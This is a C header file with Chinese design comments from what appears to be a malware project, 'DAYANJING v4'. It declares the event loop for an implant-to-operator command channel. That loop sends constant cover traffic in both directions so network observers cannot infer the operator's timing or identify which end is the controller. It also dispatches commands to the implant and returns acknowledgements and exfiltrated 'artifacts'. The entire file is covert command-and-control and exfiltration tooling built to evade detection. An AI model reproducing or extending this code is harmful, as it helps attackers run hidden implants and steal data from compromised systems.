/*
 * DAYANJING v4 — cover_loop.h
 *
 * 任务通道的**真实事件循环**——把覆盖流量从"可调用的函数"变成
 * "长期运行的行为"。
 *
 * ====================================================================
 * 被解除的限制
 * ====================================================================
 * 此前 exfil_task_cover 提供了 tick/burst，但没有任何长跑进程调用它：
 * 覆盖是"算得出来、发得出去，却没人发"。链路在空闲期仍然静默，
 * 观察者只看包数时间分布就能重建操作员节奏。
 *
 * 本层是那个"调用者"。它把收信元、发覆盖、派发命令/回执合并成
 * 一个可长期运行的循环：
 *
 *     while (!stop) {
 *         poll(fd, 到下次覆盖到期的时间)
 *         有入站 -> 解一个信元 -> PAD 丢弃 / 命令或回执派发给回调
 *         到期   -> 补发覆盖信元
 *     }
 *
 * ====================================================================
 * 两端都要跑
 * ====================================================================
 * 覆盖只保护**本端的出站方向**。下行（服务端->植入体）的静默要由
 * 服务端的循环补，上行（植入体->服务端）的静默要由植入体的循环补。
 * 只在一端跑覆盖，另一方向仍然是可读的：观察者能看到"服务端每 500ms
 * 发一个包，植入体一分钟才回一个"——这直接暴露了谁是控制端。
 *
 * 因此本层是**每端一个实例**，side 决定收到的是命令还是回执：
 *   EXF_LOOP_IMPLANT  : 收命令 -> on_cmd ；发回执
 *   EXF_LOOP_OPERATOR : 收回执 -> on_ack ；发命令
 * 两端各跑一个 exfil_cover_loop_run，链路双向才都是恒定形态。
 *
 * ====================================================================
 * 三条硬规则
 * ====================================================================
 * 1) poll 超时不得长于覆盖周期。
 *    若用 -1（无限阻塞）等待入站，覆盖就会只在有流量时才被顺带发出，
 *    等于没发。run 内部固定以 period_ms 为 poll 上限，保证即使链路
 *    完全空闲也能按时吐出覆盖。
 *
 * 2) 时钟必须注入。
 *    now_ms / clock_fn 由调用方提供，本层不读系统时钟。测试可把时间
 *    推进到任意点，不需要 sleep，"多久发一个覆盖"可精确断言。
 *    生产传 CLOCK_MONOTONIC 的毫秒即可。
 *
 * 3) PAD 不是事件。
 *    收到的覆盖信元只累加 pad_recv 并立即继续，绝不派发给回调，
 *    也不推进任何应用层状态。覆盖若被当成命令处理，等于给对端
 *    一条"低成本触发回调"的路。
 *
 * ====================================================================
 * 内存与生命周期
 * ====================================================================
 * 本结构**不持有** ch（只持指针）与 fd（只记值），因此 wipe 不关 fd、
 * 不动 ch。会话密钥的清除由 exfil_task_chan_wipe 负责，避免 double
 * 清理与 use-after-free。
 */

#ifndef DAYANJING_EXFIL_COVER_LOOP_H
#define DAYANJING_EXFIL_COVER_LOOP_H

#include <stddef.h>
#include <stdint.h>

#include "exfil_task.h"
#include "exfil_task_link.h"
#include "exfil_task_cover.h"

#ifdef __cplusplus
extern "C" {
#endif

/* 返回码（本层错误域） */
#define EXF_LOOP_OK          0
#define EXF_LOOP_ERR_ARG    -1   /* 参数非法 / 未 init */
#define EXF_LOOP_ERR_IO     -2   /* 对端关闭 / 写失败 */
#define EXF_LOOP_ERR_AUTH   -3   /* 验签失败（密钥错 / 篡改） */
#define EXF_LOOP_ERR_REPLAY -4   /* 重放 / 计数器回退 */
#define EXF_LOOP_ERR_FMT    -5   /* 信元格式非法 */
#define EXF_LOOP_STOP       -6   /* 回调请求停止（非错误） */
#define EXF_LOOP_ERR_CLOSED -7   /* 对端 orderly 关闭（与写失败区分） */

/* 默认长跑迭代上限保护（防 run 在异常情况下永不返回） */
#define EXF_LOOP_MAX_ITER   100000u

/* 本端在线路上的角色 */
typedef enum {
    EXF_LOOP_IMPLANT  = 0,   /* 收命令、发回执 */
    EXF_LOOP_OPERATOR = 1    /* 发命令、收回执 */
} exfil_loop_side_t;

/* 时钟注入：返回单调毫秒 */
typedef uint32_t (*exfil_loop_clock_fn)(void *ud);

/* 收到一条真实命令；返回非 0 => 循环停止（EXF_LOOP_STOP） */
typedef int (*exfil_loop_cmd_fn)(void *ud, uint64_t seq,
                                 const exfil_task_cmd_t *c);

/* 收到一条回执；返回非 0 => 循环停止（EXF_LOOP_STOP） */
typedef int (*exfil_loop_ack_fn)(void *ud, uint64_t seq,
                                 const exfil_task_ack_t *a);

typedef struct {
    exfil_task_chan_t *ch;        /* 不持有，仅引用 */
    exfil_task_cover_t cov;
    exfil_loop_side_t  side;
    int                fd;
    uint32_t           period_ms;

    uint64_t cover_sent;   /* 本端发出的覆盖信元数 */
    uint64_t pad_recv;     /* 对端发来的覆盖信元数（已丢弃） */
    uint64_t msg_recv;     /* 真实命令/回执数 */
    uint64_t ticks;        /* 迭代次数 */
    uint64_t idle_ticks;   /* 无入站的迭代次数（诊断） */

    int inited;
    int stop;
} exfil_cover_loop_t;

/*
 * 初始化。budget_bpm 为 0 表示明确禁用覆盖（退化为静默链路）。
 * period_ms 为 0 取 EXF_TASK_COVER_PERIOD_MS。
 */
int exfil_cover_loop_init(exfil_cover_loop_t *L, exfil_task_chan_t *ch,
                          exfil_loop_side_t side, int fd,
                          uint32_t profile, uint32_t budget_bpm,
                          uint32_t period_ms, uint32_t now_ms);

/*
 * 单步：poll 等入站（至多 poll_ms 毫秒；<0 阻塞）-> 有入站则解一个信元
 * 并派发 -> 按 now_ms 补发到期的覆盖。
 *
 * poll_ms 为 0 表示非阻塞（测试与"只做一次维护"场景使用）。
 * out_nev 可为 NULL；返回本次处理的入站信元数（PAD 计入）。
 */
int exfil_cover_loop_step(exfil_cover_loop_t *L, uint32_t now_ms, int poll_ms,
                          exfil_loop_cmd_fn on_cmd, exfil_loop_ack_fn on_ack,
                          void *ud, int *out_nev);

/*
 * 长跑循环。内部以 clock_fn 取时间，poll 上限固定为 period_ms
 * （硬规则 1），保证空闲期也按时发覆盖。
 *
 * run_ms 为 0 表示一直跑到 stop 被置位、对端关闭或发生错误。
 * 返回 EXF_LOOP_OK 表示正常退出（stop 被置位）。
 */
int exfil_cover_loop_run(exfil_cover_loop_t *L,
                         exfil_loop_clock_fn clock_fn, void *clock_ud,
                         exfil_loop_cmd_fn on_cmd, exfil_loop_ack_fn on_ack,
                         void *ud, uint32_t run_ms);

/* 请求停止（供信号处理或其它线程调用） */
void exfil_cover_loop_stop(exfil_cover_loop_t *L);

/* 清零本层状态。不关 fd、不动 ch。 */
void exfil_cover_loop_wipe(exfil_cover_loop_t *L);

/* 观察：当前自适应覆盖速率（信元/分钟） */
uint32_t exfil_cover_loop_rate(const exfil_cover_loop_t *L);

/*
 * 记录一次真实数据发送（n_cells 为本批占用的信元数，0 视作无效）。
 *
 * 必须在发送**之后**调用，且用与 step 相同的 now_ms 时间基准。
 * 调用方在本循环之外自行 chan_cmd / chan_ack / 回传产物时，必须回注
 * 这里，否则覆盖永远按"零数据"满速率发送：
 *   - 总线上速率 = 数据 + 覆盖，会超出 budget_bpm
 *   - 更糟的是覆盖不随数据起伏，"自适应"名存实亡
 */
int exfil_cover_loop_note_data(exfil_cover_loop_t *L, uint32_t n_cells,
                               uint32_t now_ms);

const char *exfil_cover_loop_errstr(int e);

#ifdef __cplusplus
}
#endif

#endif /* DAYANJING_EXFIL_COVER_LOOP_H */
